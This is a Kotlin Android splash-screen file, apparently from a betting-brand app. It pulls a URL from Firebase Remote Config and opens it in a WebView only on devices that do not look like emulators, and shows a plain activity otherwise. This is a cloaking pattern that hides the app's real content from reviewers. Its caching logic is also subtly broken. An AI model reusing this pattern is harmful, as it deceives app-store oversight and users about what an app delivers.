package dear.melbet.soor

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.util.Log
import android.widget.Toast
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.jaredrummler.android.device.DeviceName
import dear.melbet.soor.R
import android.telephony.TelephonyManager




class SplashActivity : AppCompatActivity() {
    private var path: String = ""
    private lateinit var pref: SharedPreferences
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        init()

        if (path.isEmpty()) {
            loadFire()
        } else {
            val intent = Intent(this, WebViewActivity::class.java)
            intent.putExtra("1", path)
            startActivity(intent)
        }
    }

    private fun loadFire() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        remoteConfig.setDefaultsAsync(R.xml.remote_config_defaults)
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    path = remoteConfig.getString("url")
                    val telMgr = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                    val simState: Int = telMgr.simState
                    if (path.isEmpty()|| Build.MANUFACTURER == "unknown") {
                        val intent = Intent(this, MainActivity::class.java)
                        startActivity(intent)
                    }
                    else {
                        val intent = Intent(this, WebViewActivity::class.java)
                        intent.putExtra("1", path)
                        startActivity(intent)
                        val pref: SharedPreferences =
                            getSharedPreferences("Data", MODE_PRIVATE)
                        val editor = pref.edit()
                        editor.putString("2", path).apply()
                    }
                } else {
                    val intent = Intent(this, MainActivity::class.java)
                    startActivity(intent)
                }
            }
    }

    private fun init(){
        val pref: SharedPreferences =
            getSharedPreferences("Data", MODE_PRIVATE)
        val editor = pref.edit()
        editor.putString("2", path).apply()
        path = pref.getString("2", path)!!
    }
    private fun simDevice(context: Context): Boolean{
        val tm = context.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        return tm.simState == TelephonyManager.SIM_STATE_ABSENT
    }
}